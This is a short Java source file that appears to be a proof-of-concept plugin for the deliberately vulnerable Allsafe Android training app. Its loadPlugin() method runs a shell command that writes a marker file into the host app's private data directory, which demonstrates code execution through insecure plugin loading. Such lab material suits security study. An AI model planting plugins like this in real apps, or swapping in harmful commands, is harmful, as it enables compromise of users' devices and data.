package infosecadventures.allsafe.plugin;

import android.os.Bundle;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class Loader extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_loader);

    }

    public static Object loadPlugin() {
        try {
            Runtime.getRuntime().exec("touch /data/data/infosecadventures.allsafe/compromised1336").waitFor();
        } catch (Exception e){
            throw new RuntimeException();
        }
        return null;
    }

}